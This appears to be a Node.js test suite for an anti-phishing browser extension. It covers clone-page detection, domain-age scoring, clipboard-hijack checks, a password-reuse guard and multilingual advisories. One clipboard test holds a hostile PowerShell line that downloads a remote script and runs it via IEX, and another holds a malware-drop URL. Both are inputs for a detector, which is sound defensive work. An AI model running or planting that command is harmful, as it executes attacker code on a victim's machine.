import test from 'node:test';
import assert from 'node:assert/strict';

import { analyzeUniversalDomPhishGraph } from '../content/structural-phish-graph.js';
import { evaluateDomainAgeRisk, queryFreeRdapDomainAge } from '../background/rdap-sentinel.js';
import {
  verifyClipboardIntegrity,
  hashPasswordWithSalt,
  checkCrossOriginCredentialReuse
} from '../shared/universal-behavior-guard.js';
import { computeLexicalAnomalyScore } from '../shared/markov-lexical-scorer.js';
import { calculateRisk } from '../background/risk-engine.js';
import { ADVISORIES, getText, goldenRuleForSignal } from '../shared/citizen-messages.js';
import { generateXRayTeachingCards } from '../shared/xray-educator.js';
import { detectThreatCategory } from '../ui/blocked.js';
import { getVernacularAdvisory } from '../shared/vernacular-coach.js';

test('Universal Invariant 1: Unknown credit union cloned page triggers SIG_UNIVERSAL_DOM_CLONE_PHISH (0 brand keywords)', () => {
  // Cloned phishing page for an unknown local bank/credit union with 75% dead links, 60% external media
  const cloneMetrics = {
    deadLinkRatio: 0.75,
    externalLinkRatio: 0.20,
    externalMediaRatio: 0.60,
    hasPasswordInput: true,
    isFormOrphaned: false,
    totalLinks: 20,
    totalMedia: 15
  };

  const result = analyzeUniversalDomPhishGraph(cloneMetrics, 'my-local-coop-portal.com');
  assert.equal(result.detected, true);
  assert.equal(result.confidenceScore, 85);
  assert.equal(result.signal, 'SIG_UNIVERSAL_DOM_CLONE_PHISH');
  assert.equal(result.metrics.deadLinkRatio, 0.75);
  assert.equal(result.metrics.externalMediaRatio, 0.60);
});

test('Universal Invariant 2: Risk Engine enforces Hard Override danger (Score >= 85) on universal DOM clone phishing', () => {
  const url = 'https://my-local-coop-portal.com/login';
  const domSignals = {
    hasPasswordInput: true,
    universalDomPhishGraph: {
      detected: true,
      confidenceScore: 85,
      signal: 'SIG_UNIVERSAL_DOM_CLONE_PHISH',
      reason: 'Universal structural clone anomaly: 75% dead navigation links with external assets.'
    }
  };

  const verdict = calculateRisk(url, [], null, domSignals, null, null, null);
  assert.equal(verdict.action, 'block');
  assert.equal(verdict.severity, 'danger');
  assert.ok(verdict.score >= 85, `Expected score >= 85, got ${verdict.score}`);
  assert.ok(verdict.signals.some(s => s.id === 'SIG_UNIVERSAL_DOM_CLONE_PHISH'));
});

test('Universal Invariant 3: Legitimate SaaS login page with internal navigation and same-origin assets remains safe', () => {
  const saasMetrics = {
    deadLinkRatio: 0.05,
    externalLinkRatio: 0.05,
    externalMediaRatio: 0.0,
    hasPasswordInput: true,
    isFormOrphaned: false,
    totalLinks: 20,
    totalMedia: 10
  };

  const result = analyzeUniversalDomPhishGraph(saasMetrics, 'app.acme-saas.com');
  assert.equal(result.detected, false);
  assert.equal(result.confidenceScore, 0);

  const url = 'https://app.acme-saas.com/login';
  const domSignals = {
    hasPasswordInput: true,
    universalDomPhishGraph: result
  };
  const verdict = calculateRisk(url, [], null, domSignals, null, null, null);
  assert.notEqual(verdict.action, 'block');
  assert.ok(verdict.score <= 35, `Expected safe/caution score <= 35, got ${verdict.score}`);
});

test('Universal Invariant 4: Form action isolation triggers clone signature on dead action with credential input', () => {
  const orphanedMetrics = {
    deadLinkRatio: 0.58,
    externalLinkRatio: 0.10,
    externalMediaRatio: 0.20,
    isFormOrphaned: true,
    hasPasswordInput: true
  };

  const result = analyzeUniversalDomPhishGraph(orphanedMetrics, 'unknown-corporate-portal.org');
  assert.equal(result.detected, true);
  assert.equal(result.signal, 'SIG_UNIVERSAL_DOM_CLONE_PHISH');
});

test('Universal Invariant 5: RDAP Sentinel flags 3-day-old domain asking for credentials as SIG_UNIVERSAL_NRD_CREDENTIAL_TRAP', () => {
  const nowMs = Date.parse('2026-10-23T12:00:00Z');
  const regDate = '2026-10-20T12:00:00Z'; // 3 days ago

  const evalResult = evaluateDomainAgeRisk(regDate, nowMs, true);
  assert.equal(evalResult.isNewlyRegistered, true);
  assert.equal(evalResult.ageDays, 3);
  assert.equal(evalResult.score, 85);
  assert.equal(evalResult.signal, 'SIG_UNIVERSAL_NRD_CREDENTIAL_TRAP');
  assert.equal(evalResult.hardOverride, true);
});

test('Universal Invariant 6: RDAP Sentinel flags 5-day-old domain without credentials as caution (Score 45, no hard override)', () => {
  const nowMs = Date.parse('2026-10-23T12:00:00Z');
  const regDate = '2026-10-18T12:00:00Z'; // 5 days ago

  const evalResult = evaluateDomainAgeRisk(regDate, nowMs, false);
  assert.equal(evalResult.isNewlyRegistered, true);
  assert.equal(evalResult.ageDays, 5);
  assert.equal(evalResult.score, 45);
  assert.equal(evalResult.signal, 'SIG_NEWLY_REGISTERED_DOMAIN_CAUTION');
  assert.equal(evalResult.hardOverride, false);
});

test('Universal Invariant 7: Established 5-year-old domain (1825 days) via RDAP yields 0 penalty points', () => {
  const nowMs = Date.parse('2026-10-23T12:00:00Z');
  const regDate = '2021-10-23T12:00:00Z'; // 5 years ago

  const evalResult = evaluateDomainAgeRisk(regDate, nowMs, true);
  assert.equal(evalResult.isNewlyRegistered, false);
  assert.equal(evalResult.score, 0);
  assert.equal(evalResult.signal, null);
  assert.equal(evalResult.hardOverride, false);
});

test('Universal Invariant 8: queryFreeRdapDomainAge parses ICANN RDAP payload with mock fetch', async () => {
  const mockFetch = async (url) => {
    assert.ok(url.includes('https://rdap.org/domain/zero-day-phish-portal.com'));
    return {
      ok: true,
      json: async () => ({
        events: [
          { eventAction: 'registration', eventDate: '2026-10-21T08:00:00Z' },
          { eventAction: 'last changed', eventDate: '2026-10-21T09:00:00Z' }
        ]
      })
    };
  };

  const nowMs = Date.parse('2026-10-23T12:00:00Z');
  const res = await queryFreeRdapDomainAge('zero-day-phish-portal.com', mockFetch, nowMs, true);
  assert.ok(res);
  assert.equal(res.isNewlyRegistered, true);
  assert.equal(res.ageDays, 2);
  assert.equal(res.signal, 'SIG_UNIVERSAL_NRD_CREDENTIAL_TRAP');
  assert.equal(res.score, 85);
});

test('Universal Invariant 9: Risk Engine enforces Hard Override danger on NRD asking for credentials on clean .com', () => {
  const url = 'https://portal-update-auth-system.com/signin';
  const threatIntel = {
    domainAgeDays: 2
  };
  const domSignals = {
    hasPasswordInput: true
  };

  const verdict = calculateRisk(url, [], null, domSignals, threatIntel, null, null);
  assert.equal(verdict.action, 'block');
  assert.equal(verdict.severity, 'danger');
  assert.ok(verdict.score >= 85, `Expected score >= 85, got ${verdict.score}`);
  assert.ok(verdict.signals.some(s => s.id === 'SIG_UNIVERSAL_NRD_CREDENTIAL_TRAP'));
});

test('Universal Invariant 10: verifyClipboardIntegrity detects silent replacement with shell execution command', () => {
  const userSelectedText = 'Order #12345 Confirmation';
  const clipboardWritePayload = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://192.168.1.1/run.ps1 | IEX';

  const check = verifyClipboardIntegrity(userSelectedText, clipboardWritePayload);
  assert.equal(check.hijacked, true);
  assert.equal(check.signal, 'SIG_UNIVERSAL_CLIPBOARD_MISMATCH');
  assert.equal(check.score, 85);
});

test('Universal Invariant 11: verifyClipboardIntegrity detects silent replacement with malicious URL drop', () => {
  const userSelectedText = 'Click here for the coupon';
  const clipboardWritePayload = 'https://malicious-drop.com/setup.exe';

  const check = verifyClipboardIntegrity(userSelectedText, clipboardWritePayload);
  assert.equal(check.hijacked, true);
  assert.equal(check.signal, 'SIG_UNIVERSAL_CLIPBOARD_MISMATCH');
  assert.equal(check.score, 85);
});

test('Universal Invariant 12: verifyClipboardIntegrity allows legitimate identical copies and button copies without selection', () => {
  // Case A: Identical copy
  const normalCopy = verifyClipboardIntegrity('https://github.com', 'https://github.com');
  assert.equal(normalCopy.hijacked, false);

  // Case B: User clicks "Copy Code" without selecting text first
  const buttonCopy = verifyClipboardIntegrity('', 'npm install my-package');
  assert.equal(buttonCopy.hijacked, false);
});

test('Universal Invariant 13: hashPasswordWithSalt produces non-reversible deterministic 16-hex digest', () => {
  const p1 = 'MySecr3tP@ssw0rd!';
  const h1 = hashPasswordWithSalt(p1);
  const h2 = hashPasswordWithSalt(p1);
  assert.equal(h1, h2);
  assert.equal(typeof h1, 'string');
  assert.equal(h1.length, 16);
  assert.notEqual(h1, p1);
});

test('Universal Invariant 14: Zero-Knowledge Password Reuse Guard catches university password reused on untrusted phishing origin', () => {
  const authenticOrigin = 'my-university.edu';
  const myPassword = 'StrongStudentPassword2026!';
  const userVault = {
    [hashPasswordWithSalt(myPassword)]: authenticOrigin
  };

  const untrustedPhishHost = 'campus-portal-verify.org';
  const check = checkCrossOriginCredentialReuse(myPassword, untrustedPhishHost, userVault);

  assert.equal(check.reusedOnUntrustedOrigin, true);
  assert.equal(check.originalOrigin, authenticOrigin);
  assert.equal(check.signal, 'SIG_CROSS_ORIGIN_PASSWORD_REUSE_TRAP');
  assert.equal(check.score, 95);
});

test('Universal Invariant 15: Zero-Knowledge Password Reuse Guard allows legitimate subdomains of same root domain', () => {
  const authenticOrigin = 'corp-portal.com';
  const myPassword = 'CorporateExecutiveKey#99';
  const userVault = {
    [hashPasswordWithSalt(myPassword)]: authenticOrigin
  };

  // Subdomain of same registrable domain is allowed
  const legitimateSubdomain = 'auth.corp-portal.com';
  const check = checkCrossOriginCredentialReuse(myPassword, legitimateSubdomain, userVault);

  assert.equal(check.reusedOnUntrustedOrigin, false);
  assert.equal(check.signal, null);
});

test('Universal Invariant 16: Risk Engine enforces Hard Override danger (Score 95) on SIG_CROSS_ORIGIN_PASSWORD_REUSE_TRAP', () => {
  const url = 'https://campus-portal-verify.org/login';
  const domSignals = {
    hasPasswordInput: true,
    crossOriginPasswordReuse: {
      reusedOnUntrustedOrigin: true,
      originalOrigin: 'my-university.edu'
    }
  };

  const verdict = calculateRisk(url, [], null, domSignals, null, null, null);
  assert.equal(verdict.action, 'block');
  assert.equal(verdict.severity, 'danger');
  assert.equal(verdict.score, 95);
  assert.ok(verdict.signals.some(s => s.id === 'SIG_CROSS_ORIGIN_PASSWORD_REUSE_TRAP'));
});

test('Universal Invariant 17: Markov Lexical Scorer catches interleaved DGA domains and flags anomalous transitions', () => {
  // Case A: High digit-letter interleaving & rare bigrams (DGA)
  const dga = computeLexicalAnomalyScore('x7q9-k2m8-login.com');
  assert.equal(dga.isAnomalous, true);
  assert.ok(dga.anomalyScore >= 60, `Expected DGA score >= 60, got ${dga.anomalyScore}`);
  assert.ok(dga.details.letterDigitSwitches >= 3);

  // Case B: Extreme consonant cluster run
  const clusterDga = computeLexicalAnomalyScore('bcdfghjklmn.xyz');
  assert.equal(clusterDga.isAnomalous, true);
  assert.ok(clusterDga.anomalyScore >= 60);

  // Case C: Normal pronounceable domain
  const normal = computeLexicalAnomalyScore('freshmarket-india.com');
  assert.equal(normal.isAnomalous, false);
  assert.ok(normal.anomalyScore <= 30, `Expected normal score <= 30, got ${normal.anomalyScore}`);
});

test('Universal Invariant 18: Multilingual Coverage for all 5 Universal Signals across EN, TA, HI, TE', () => {
  const newSignals = [
    'SIG_UNIVERSAL_DOM_CLONE_PHISH',
    'SIG_UNIVERSAL_NRD_CREDENTIAL_TRAP',
    'SIG_NEWLY_REGISTERED_DOMAIN_CAUTION',
    'SIG_UNIVERSAL_CLIPBOARD_MISMATCH',
    'SIG_CROSS_ORIGIN_PASSWORD_REUSE_TRAP'
  ];

  const langs = ['en', 'ta', 'hi', 'te'];

  for (const sig of newSignals) {
    assert.ok(ADVISORIES[sig], `Missing advisory definition for ${sig}`);
    for (const l of langs) {
      const msg = ADVISORIES[sig][l];
      assert.ok(msg && typeof msg === 'string' && msg.length > 10, `Missing or short translation for ${sig} in ${l}`);
      const fetched = getText(l, `ADVISORIES.${sig}`);
      assert.equal(fetched, msg);
    }

    const rule = goldenRuleForSignal(sig);
    assert.ok(['otp_password', 'upi', 'apk', 'digital_arrest', 'generic'].includes(rule), `Unexpected golden rule ${rule} for ${sig}`);
  }
});

test('Universal Invariant 19: Spot The Scam Challenge and Blocked UI never hallucinate SBI or banking claims on unverified ad-rotator redirects (werefilledwit.org)', () => {
  const suspectUrl = 'https://werefilledwit.org/stream/watch';
  const analysisResult = {
    signals: [{ id: 'SIG_MALVERTISING_POPUP_NETWORK' }],
    reasons: [{ id: 'SIG_MALVERTISING_POPUP_NETWORK', reason: 'High-risk malvertising redirect or obfuscated pattern detected.' }]
  };

  const { cards } = generateXRayTeachingCards(analysisResult, suspectUrl);
  const quizCard = cards.find(c => c.cardType === 'MICRO_QUIZ');

  assert.ok(quizCard, 'Micro-quiz card must exist');
  // Must NOT contain hallucinated SBI references or fake "sbi.verify-account" links
  assert.equal(quizCard.question.toLowerCase().includes('sbi'), false, 'Quiz question must never hallucinate SBI on ad-rotator redirect');
  assert.equal(quizCard.options.some(o => o.toLowerCase().includes('state bank of india')), false, 'Quiz options must never hallucinate State Bank of India');
  assert.equal(quizCard.options.some(o => o.toLowerCase().includes('sbi')), false);
  assert.ok(quizCard.question.includes('werefilledwit.org'));
  assert.ok(quizCard.options[quizCard.correctIndex].includes('Close the redirected page immediately'));

  // Test threat categorization for redirect reason
  const detectedCategory = detectThreatCategory('werefilledwit.org', 'High-risk malvertising redirect detected');
  assert.equal(detectedCategory, 'SIG_MALVERTISING_POPUP_NETWORK');

  // Test vernacular coach advisory for malvertising redirect
  const adv = getVernacularAdvisory('SIG_MALVERTISING_POPUP_NETWORK', 'en-IN');
  assert.equal(adv.title, 'Rogue Ad-Rotator / Malvertising Redirect Blocked');
  assert.equal(adv.explanation.toLowerCase().includes('sbi'), false);
  assert.ok(adv.goldenRule.toLowerCase().includes('close unexpected redirected tabs'));
});

test('Universal Invariant 20: Generic unverified domain quiz teaches domain verification without hallucinating banking brands', () => {
  const suspectUrl = 'https://unverified-sample-host.com';
  const analysisResult = {
    signals: [{ id: 'SIG_UNTRUSTED_TLD' }],
    reasons: ['Suspicious domain reputation']
  };

  const { cards } = generateXRayTeachingCards(analysisResult, suspectUrl);
  const quizCard = cards.find(c => c.cardType === 'MICRO_QUIZ');

  assert.ok(quizCard);
  assert.equal(quizCard.question.toLowerCase().includes('sbi'), false);
  assert.equal(quizCard.options.some(o => o.toLowerCase().includes('state bank of india')), false);
  assert.ok(quizCard.options[quizCard.correctIndex].includes('Verify the web address through official channels'));
});
